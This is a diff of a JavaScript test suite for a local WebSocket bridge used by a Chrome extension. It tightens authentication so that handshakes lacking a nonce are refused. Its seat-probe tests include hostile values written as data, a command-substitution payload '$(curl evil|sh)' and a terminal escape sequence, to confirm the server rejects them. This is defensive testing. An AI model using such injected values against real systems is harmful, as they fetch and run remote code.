@@ -65,13 +65,12 @@ function assert(cond, name, detail) {
 // --- tiny WS client (client frames must be masked) ---------------------------
 // Authenticates like the real extension (1.34+): ?c=, check the server's proof
 // with this run's key, answer with ours — resolved once the proof is sent.
-// opts.legacy: an extension from before 1.34 (no ?c=, seated on the grace).
 // opts.key: prove with another key (another OS user); opts.skipVerify: send
 // that proof without checking the server's (an attacker would).
 function wsClient(port, id = 'alpha-test', name, install, vOverride, boot, opts = {}) {
   return new Promise((resolve, reject) => {
     const cn = nonce();
-    let authed = !!opts.legacy;
+    let authed = false;
     const key = crypto.randomBytes(16).toString('base64');
     const socket = net.connect(port, '127.0.0.1');
     let handshaken = false;
@@ -102,7 +101,7 @@ function wsClient(port, id = 'alpha-test', name, install, vOverride, boot, opts 
       // ?v=/?id= mirror the real extension's handshake (cli health compares
       // versions against the repo manifest; --profile prefix-matches the id).
       socket.write(
-        `GET /ws?v=${vOverride || MANIFEST_V}&id=${id}${name ? `&name=${name}` : ''}${install ? `&install=${install}` : ''}${boot ? `&boot=${boot}` : ''}${opts.legacy ? '' : `&c=${cn}`} HTTP/1.1\r\nHost: 127.0.0.1:${port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${key}\r\nSec-WebSocket-Version: 13\r\n\r\n`
+        `GET /ws?v=${vOverride || MANIFEST_V}&id=${id}${name ? `&name=${name}` : ''}${install ? `&install=${install}` : ''}${boot ? `&boot=${boot}` : ''}&c=${cn} HTTP/1.1\r\nHost: 127.0.0.1:${port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${key}\r\nSec-WebSocket-Version: 13\r\n\r\n`
       );
     });
     socket.on('data', (chunk) => {
@@ -1700,13 +1699,17 @@ try {
       setTimeout(() => resolve(false), 2000);
     });
     assert(early && !(await profileIds()).includes('early-test'), 'ext auth: anything but the proof as the first frame closes the socket, no seat');
-    // An extension from before 1.34 (no ?c=): seated on the grace, flagged in health.
-    const legacy = await wsClient(PORT, 'legacy-test', 'elm', 'store', null, null, { legacy: true });
+    // No ?c= (an extension that can't authenticate): refused before the upgrade, no seat.
+    const bare = await new Promise((resolve) => {
+      let head = '';
+      const sock = net.connect(PORT, '127.0.0.1', () => sock.write(`GET /ws?v=${MANIFEST_V}&id=nonce-less-test&name=elm&install=store HTTP/1.1\r\nHost: 127.0.0.1:${PORT}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${crypto.randomBytes(16).toString('base64')}\r\nSec-WebSocket-Version: 13\r\n\r\n`));
+      sock.on('data', (c) => (head += c));
+      sock.on('close', () => resolve(head));
+      sock.on('error', () => resolve(head));
+      setTimeout(() => (sock.destroy(), resolve(head)), 2000);
+    });
     let h = JSON.parse((await cli('health')).stdout);
-    const row = h.profiles.find((p) => p.id === 'legacy-test');
-    assert(row?.legacy === true && h.warn.some((w) => w.startsWith('profile elm runs chrome-bridge extension') && w.includes('update it')) && !h.profiles.find((p) => p.id === 'alpha-test').legacy, 'ext auth: a pre-1.34 extension is still seated (grace), flagged legacy with a ⚠ naming the update', JSON.stringify(h));
-    legacy.socket.destroy();
-    await new Promise((r) => setTimeout(r, 100));
+    assert(!bare.includes(' 101 ') && !h.profiles.some((p) => p.id === 'nonce-less-test'), 'ext auth: a handshake without ?c= is refused before the upgrade — no seat without local authentication', bare + JSON.stringify(h));
     // An extension Chrome gave no key: &nokey=<why> → refused before the
     // upgrade, the helper registered again (here: rewritten), health says why.
     fs.rmSync(manifestFile);
@@ -1847,7 +1850,7 @@ try {
     });
     s.on('connect', () =>
       s.write(
-        `GET /ws?id=malformed-test HTTP/1.1\r\nHost: 127.0.0.1:${PORT}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${crypto.randomBytes(16).toString('base64')}\r\nSec-WebSocket-Version: 13\r\n\r\n`
+        `GET /ws?id=malformed-test&c=${nonce()} HTTP/1.1\r\nHost: 127.0.0.1:${PORT}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: ${crypto.randomBytes(16).toString('base64')}\r\nSec-WebSocket-Version: 13\r\n\r\n`
       )
     );
     s.on('close', () => resolve(handshaken));
@@ -1887,10 +1890,10 @@ try {
     `v=1.0.0&id=seat-evil-name&name=${encodeURIComponent('$(curl evil|sh)')}&install=dev`,
     `v=1.0.0&id=${encodeURIComponent('x\u001b[2J')}`,
     `v=1.0.0&id=seat-empty-name&name=`,
-  ]) assert((await seatProbe(query)) === false, `server: a seat handshake with a hostile value is refused (${query.slice(0, 40)})`);
+  ]) assert((await seatProbe(`${query}&c=${nonce()}`)) === false, `server: a seat handshake with a hostile value is refused (${query.slice(0, 40)})`);
   h = await cli('health');
   assert(!/seat-evil|attacker|curl/.test(h.stdout + h.stderr), 'health never shows a refused seat or its values', h.stdout + h.stderr);
-  assert((await seatProbe('v=1.33.1&id=seat-fine-0a1b&name=poplar&install=dev&boot=1')) === true, 'server: the extension\'s own handshake shape still gets a seat');
+  assert((await seatProbe(`v=1.33.1&id=seat-fine-0a1b&name=poplar&install=dev&boot=1&c=${nonce()}`)) === true, 'server: the extension\'s own handshake shape still gets a seat');
   await new Promise((r) => setTimeout(r, 100)); // let that seat drop before later sections count profiles
 
   // DNS-rebinding guard: a non-loopback Host is refused on every route, even
